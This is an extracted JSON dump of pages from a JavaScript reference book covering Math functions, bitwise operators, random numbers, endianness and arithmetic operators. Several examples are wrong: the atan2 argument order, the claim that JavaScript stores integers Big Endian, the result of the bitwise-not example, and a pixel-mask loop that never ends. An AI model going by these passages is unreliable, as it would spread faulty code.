        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And the variants for  ceil  and  floor :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "  function  ceilTo ( value ,  places ){       var  power  =  Math. pow ( 10 ,  places );       return  Math. ceil ( value  *  power )   /  power ;   }   function  floorTo ( value ,  places ){       var  power  =  Math. pow ( 10 ,  places );       return  Math. floor ( value  *  power )   /  power ;   }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.4: Trigonometry",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "All angles below are in radians. An angle  r  in radians has measure  180   *  r  /  Math. PI  in degrees. Sine",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. sin ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the sine of  r , a value between -1 and 1.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. asin ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the arcsine (the reverse of the sine) of  r .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. asinh ( r )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the hyperbolic arcsine of  r .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Cosine",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. cos ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the cosine of  r , a value between -1 and 1",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. acos ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the arccosine (the reverse of the cosine) of  r .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. acosh ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 133",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "This will return the hyperbolic arccosine of  r .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Tangent",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. tan ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the tangent of  r .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. atan ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the arctangent (the reverse of the tangent) of  r . Note that it will return an angle in radians between - \u03c0 / 2  and  \u03c0 / 2 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. atanh ( r );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the hyperbolic arctangent of  r .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. atan2 ( x ,  y );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will return the value of an angle from  ( 0 ,   0 )  to  ( x ,  y )  in radians. It will return a value between  - \u03c0  and  \u03c0 , not including  \u03c0 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.5: Bitwise operators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Note that all bitwise operations operate on 32-bit integers by passing any operands to the internal function  ToInt32 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Bitwise or",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a ;",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a  =  0b0011  |  0b1010 ;   // a === 0b1011",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// truth table // 1010 | (or) // 0011   // 1011  (result)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise and",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  0b0011  &  0b1010 ;   // a === 0b0010",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// truth table // 1010 & (and) // 0011   // 0010  (result)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise not",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  ~0b0011 ;   // a === 0b1100 // truth table // 10 ~(not) // 01  (result)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise xor (exclusive or)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  0b1010  ^  0b0011 ;   // a === 0b1001",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// truth table // 1010 ^ (xor) // 0011   // 1001  (result)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise left shift",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  0b0001  <<   1 ;   // a === 0b0010 a  =  0b0001  <<   2 ;   // a === 0b0100 a  =  0b0001  <<   3 ;   // a === 0b1000",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 134",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Shift left is equivalent to integer multiply by  Math. pow ( 2 ,  n ) . When doing integer math, shift can signi\ufb01cantly improve the speed of some math operations.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  n  =   2 ; var  a  =   5.4 ; var  result  =   ( a  <<  n )   ===  Math. floor ( a )   *  Math. pow ( 2 , n );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// result is true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a  =   5.4   <<  n ;   // 20",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise right shift  >>  (Sign-propagating shift)  >>>  (Zero-\ufb01ll right shift)",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  0b1001  >>   1 ;   // a === 0b0100 a  =  0b1001  >>   2 ;   // a === 0b0010 a  =  0b1001  >>   3 ;   // a === 0b0001 a  =  0b1001  >>>   1 ;   // a === 0b0100 a  =  0b1001  >>>   2 ;   // a === 0b0010 a  =  0b1001  >>>   3 ;   // a === 0b0001",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A negative 32bit value always has the left most bit on:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =  0b11111111111111111111111111110111  |   0 ;    console. log ( a );   // -9",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "b  =  a  >>   2 ;       // leftmost bit is shifted 1 to the right then new left most bit is set to on (1)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( b );   // -3",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "b  =  a  >>>   2 ;      // leftmost bit is shifted 1 to the right. the new left most bit is set to off (0)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( b );   // 2147483643",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The result of a  >>>  operation is always positive. The result of a  >>  is always the same sign as the shifted value. Right shift on positive numbers is the equivalent of dividing by the  Math. pow ( 2 , n )  and \ufb02ooring the result:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =   256.67 ; n  =   4 ; result  =   ( a  >>  n )   ===  Math. floor (  Math. floor ( a )   /  Math. pow ( 2 , n )   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// result is true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a  =  a  >>  n ;   //  16 result  =   ( a  >>>  n )   ===  Math. floor (  Math. floor ( a )   /  Math. pow ( 2 , n )   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// result is true",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "a  =  a  >>>  n ;   //  16",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Right shift zero \ufb01ll ( >>> ) on negative numbers is di\ufb00erent. As JavaScript does not convert to unsigned ints when doing bit operations there is no operational equivalent:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  =   - 256.67 ; result  =   ( a  >>>  n )   ===  Math. floor (  Math. floor ( a )   /  Math. pow ( 2 , n )   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// result is false",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Bitwise assignment operators",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "With the exception of not ( ~ ) all the above bitwise operators can be used as assignment operators:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "a  |=  b ;     // same as: a = a | b; a  ^=  b ;     // same as: a = a ^ b; a  &=  b ;     // same as: a = a & b; a  >>=  b ;    // same as: a = a >> b; a  >>>=  b ;   // same as: a = a >>> b; a  <<=  b ;    // same as: a = a << b;",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 135",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Warning : JavaScript uses Big Endian to store integers. This will not always match the Endian of the device/OS. When using typed arrays with bit lengths greater than 8 bits you should check if the environment is Little Endian or Big Endian before applying bitwise operations. Warning : Bitwise operators such as  &  and  |  are  not  the same as the logical operators  &&  (and) and  ||  (or). They will provide incorrect results if used as logical operators. The  ^  operator is  not  the power operator ( ab ).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.6: Incrementing (++)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The Increment operator ( ++ ) increments its operand by one. If used as a post\ufb01x, then it returns the value before incrementing. If used as a pre\ufb01x, then it returns the value after incrementing.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//postfix",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  a  =   5 ,      // 5     b  =  a ++,    // 5     c  =  a      // 6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this case,  a  is incremented after setting  b . So,  b  will be 5, and  c  will be 6.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//prefix",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  a  =   5 ,      // 5     b  =   ++ a ,    // 6     c  =  a      // 6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "In this case,  a  is incremented before setting  b . So,  b  will be 6, and  c  will be 6. The increment and decrement operators are commonly used in  for  loops, for example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ( var  i  =   0 ;  i  <   42 ;   ++ i ) {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "   // do something awesome! }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Notice how the  pre\ufb01x  variant is used. This ensures that a temporarily variable isn't needlessly created (to return the value prior to the operation).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.7: Exponentiation (Math.pow() or **)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Exponentiation makes the second operand the power of the \ufb01rst operand (ab).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   2 ,     b  =   3 ,     c  =  Math. pow ( a ,  b );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "c  will now be 8",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Version > 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "Stage 3 ES2016 (ECMAScript 7) Proposal:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "let  a  =   2 ,     b  =   3 ,",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 136",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "    c  =  a  **  b ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "c  will now be 8",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Use Math.pow to \ufb01nd the nth root of a number.",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Finding the nth roots is the inverse of raising to the nth power. For example  2  to the power of  5  is  32 . The 5th root of  32  is  2 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Math. pow ( v ,   1   /  n );   // where v is any positive real number                      // and n is any positive integer",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  a  =   16 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  b  =  Math. pow ( a ,   1   /   2 );    // return the square root of 16 = 4 var  c  =  Math. pow ( a ,   1   /   3 );    // return the cubed root of 16 = 2.5198420997897464 var  d  =  Math. pow ( a ,   1   /   4 );    // return the 4th root of 16 = 2",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.8: Random Integers and Floats",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  a  =  Math. random (); Sample value of  a :  0.21322848065742162",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Math. random ()  returns a random number between 0 (inclusive) and 1 (exclusive)",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getRandom ()   {      return  Math. random (); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To use  Math. random ()  to get a number from an arbitrary range (not  [ 0 , 1 ) ) use this function to get a random number between min (inclusive) and max (exclusive): interval of  [ min ,  max )",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getRandomArbitrary ( min ,  max )   {    return  Math. random ()   *   ( max  -  min )   +  min ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To use  Math. random ()  to get an integer from an arbitrary range (not  [ 0 , 1 ) ) use this function to get a random number between min (inclusive) and max (exclusive): interval of  [ min ,  max )",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getRandomInt ( min ,  max )   {    return  Math. floor ( Math. random ()   *   ( max  -  min ))   +  min ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To use  Math. random ()  to get an integer from an arbitrary range (not  [ 0 , 1 ) ) use this function to get a random number between min (inclusive) and max (inclusive): interval of  [ min ,  max ]",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  getRandomIntInclusive ( min ,  max )   {    return  Math. floor ( Math. random ()   *   ( max  -  min  +   1 ))   +  min ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Functions taken from https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/random",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 137",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 14.9: Addition (+)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The addition operator ( + ) adds numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   9 ,     b  =   3 ,     c  =  a  +  b ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "c  will now be 12 This operand can also be used multiple times in a single assignment:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   9 ,     b  =   3 ,     c  =   8 ,     d  =  a  +  b  +  c ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "d  will now be 20. Both operands are converted to primitive types. Then, if either one is a string, they're both converted to strings and concatenated. Otherwise, they're both converted to numbers and added.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "null   +   null ;        // 0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "null   +   undefined ;   // NaN",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "null   +   {};          // \"null[object Object]\"",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "null   +   '' ;          // \"null\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the operands are a string and a number, the number is converted to a string and then they're concatenated, which may lead to unexpected results when working with strings that look numeric.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"123\"   +   1 ;          // \"1231\" (not 124)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If a boolean value is given in place of any of the number values, the boolean value is converted to a number ( 0  for false ,  1  for  true ) before the sum is calculated:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "true   +   1 ;           // 2 false   +   5 ;          // 5 null   +   1 ;           // 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "undefined   +   1 ;      // NaN",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If a boolean value is given alongside a string value, the boolean value is converted to a string instead:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "true   +   \"1\" ;          // \"true1\" false   +   \"bar\" ;       // \"falsebar\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.10: Little / Big endian for typed arrays when using bitwise operators",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To detect the endian of the device",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  isLittleEndian  =   true ; (()=>{      var  buf  =   new  ArrayBuffer ( 4 );      var  buf8  =   new  Uint8ClampedArray ( buf );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 138",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     var  data  =   new  Uint32Array ( buf );     data [ 0 ]   =  0x0F000000 ;      if ( buf8 [ 0 ]   ===  0x0f ){         isLittleEndian  =   false ;      } })();   ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Little-Endian stores most signi\ufb01cant bytes from right to left. Big-Endian stores most signi\ufb01cant bytes from left to right.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  myNum  =  0x11223344  |   0 ;    // 32 bit signed integer var  buf  =   new  ArrayBuffer ( 4 ); var  data8  =   new  Uint8ClampedArray ( buf ); var  data32  =   new  Uint32Array ( buf );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "data32 [ 0 ]   =  myNum ;   // store number in 32Bit array",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the system uses Little-Endian, then the 8bit byte values will be",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( data8 [ 0 ] . toString ( 16 ));   // 0x44 console. log ( data8 [ 1 ] . toString ( 16 ));   // 0x33 console. log ( data8 [ 2 ] . toString ( 16 ));   // 0x22 console. log ( data8 [ 3 ] . toString ( 16 ));   // 0x11",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If the system uses Big-Endian, then the 8bit byte values will be",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( data8 [ 0 ] . toString ( 16 ));   // 0x11 console. log ( data8 [ 1 ] . toString ( 16 ));   // 0x22 console. log ( data8 [ 2 ] . toString ( 16 ));   // 0x33 console. log ( data8 [ 3 ] . toString ( 16 ));   // 0x44",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Example where Endian type is important",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  canvas  =  document. createElement ( \"canvas\" ); var  ctx  =  canvas. getContext ( \"2d\" ); var  imgData  =  ctx. getImageData ( 0 ,   0 ,  canvas. width ,  canvas. height );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// To speed up read and write from the image buffer you can create a buffer view that is // 32 bits allowing you to read/write a pixel in a single operation",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  buf32  =   new  Uint32Array ( imgData. data . buffer );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Mask out Red and Blue channels var  mask  =  0x00FF00FF ;   // bigEndian pixel channels Red,Green,Blue,Alpha",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if ( isLittleEndian ){",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "    mask  =  0xFF00FF00 ;   // littleEndian pixel channels Alpha,Blue,Green,Red",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "}      var  len  =  buf32. length ; var  i  =   0 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "while ( i  <  len ){    // Mask all pixels     buf32 [ i ]   &=  mask ;   //Mask out Red and Blue }",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "ctx. putImageData ( imgData );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.11: Get Random Between Two Numbers",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Returns a random integer between  min  and  max :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  randomBetween ( min ,  max )   {      return  Math. floor ( Math. random ()   *   ( max  -  min  +   1 )   +  min ); }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 139",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Examples:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// randomBetween(0, 10);",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Math. floor ( Math. random ()   *   11 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// randomBetween(1, 10);",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Math. floor ( Math. random ()   *   10 )   +   1 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// randomBetween(5, 20);",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Math. floor ( Math. random ()   *   16 )   +   5 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// randomBetween(-10, -2);",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Math. floor ( Math. random ()   *   9 )   -   10 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.12: Simulating events with di\ue023erent probabilities",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes you may only need to simulate an event with two outcomes, maybe with di\ufb00erent probabilities, but you may \ufb01nd yourself in a situation that calls for many possible outcomes with di\ufb00erent probabilities. Let's imagine you want to simulate an event that has six equally probable outcomes. This is quite simple.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  simulateEvent ( numEvents )   {      var  event  =  Math. floor ( numEvents * Math. random ());      return  event ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// simulate fair die",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"Rolled a \" +( simulateEvent ( 6 )+ 1 ));    // Rolled a 2",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "However, you may not want equally probable outcomes. Say you had a list of three outcomes represented as an array of probabilities in percents or multiples of likelihood. Such an example might be a weighted die. You could rewrite the previous function to simulate such an event.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  simulateEvent ( chances )   {      var  sum  =   0 ;     chances. forEach ( function ( chance )   {         sum += chance ;      });      var  rand  =  Math. random ();      var  chance  =   0 ;      for ( var  i = 0 ;  i < chances. length ;  i ++)   {         chance += chances [ i ]/ sum ;          if ( rand < chance )   {              return  i ;          }      }    ",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // should never be reached unless sum of probabilities is less than 1      // due to all being zero or some being negative probabilities",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   - 1 ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// simulate weighted dice where 6 is twice as likely as any other face // using multiples of likelihood",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"Rolled a \" +( simulateEvent ([ 1 , 1 , 1 , 1 , 1 , 2 ])+ 1 ));    // Rolled a 1",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// using probabilities",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"Rolled a \" +( simulateEvent ([ 1 / 7 , 1 / 7 , 1 / 7 , 1 / 7 , 1 / 7 , 2 / 7 ])+ 1 ));    // Rolled a 6",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 140",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "As you probably noticed, these functions return an index, so you could have more descriptive outcomes stored in an array. Here's an example.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  rewards  =   [ \"gold coin\" , \"silver coin\" , \"diamond\" , \"god sword\" ]; var  likelihoods  =   [ 5 , 9 , 1 , 0 ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// least likely to get a god sword (0/15 = 0%, never), // most likely to get a silver coin (9/15 = 60%, more than half the time) // simulate event, log reward",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( \"You get a \" + rewards [ simulateEvent ( likelihoods )]);    // You get a silver coin",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 14.13: Subtraction (-)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The subtraction operator ( - ) subtracts numbers.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  a  =   9 ; var  b  =   3 ; var  c  =  a  -  b ;",
        "font_name": "RobotoMono-Regular",
